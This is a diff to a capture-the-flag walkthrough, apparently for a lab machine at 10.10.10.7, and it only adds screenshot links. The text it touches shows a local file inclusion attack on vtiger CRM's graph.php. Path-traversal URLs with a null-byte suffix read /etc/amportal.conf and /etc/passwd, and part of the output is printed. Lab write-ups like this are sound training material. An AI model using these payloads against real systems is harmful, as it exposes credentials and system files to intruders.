@@ -597,9 +597,14 @@ Primarily, we are interested in `#LFI Exploit: /vtigercrm/graph.php?current_lang
 
 From our earlier Gobuster search, we've already seen a directory `/vtigercrm`.
 
-Going to our web browser, we go to `(https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action)`, but somehow got redirected to `(https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%2500&module=Accounts&action)`, with the error message: `Sorry! Attempt to access restricted file.` displayed. 
+Going to our web browser, we go to `(https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action)`, but somehow got redirected to `(https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%2500&module=Accounts&action)`, with the error message: `Sorry! Attempt to access restricted file.` displayed.
+
+![restricted2500](https://user-images.githubusercontent.com/21957042/114298271-1d52fc00-9ae8-11eb-81bf-999b7b095ca5.png)
 
 We manually change the URL again from 2500 back to 00, and this time, get a valid HTML page. However, it's just a chunk of text and we instead we view the page source to see a formated version.
+
+![access00](https://user-images.githubusercontent.com/21957042/114298272-1deb9280-9ae8-11eb-979f-81375abd788f.png)
+
 ```
 # This file is part of FreePBX.
 #
@@ -732,6 +737,9 @@ Permission denied, please try again.
 We're getting some permission denied errors despite the correct password. Maybe it's the username that's wrong. Let's use the VTigerCRM exploit we used earlier to get the `etc/passwd` file to find the users.
 
 Upon navigating to `(view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action)` on our web browser, we see some usernames indeed.
+
+![etc passwd](https://user-images.githubusercontent.com/21957042/114298273-1e842900-9ae8-11eb-948e-ebfb19c7954e.png)
+
 ```
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
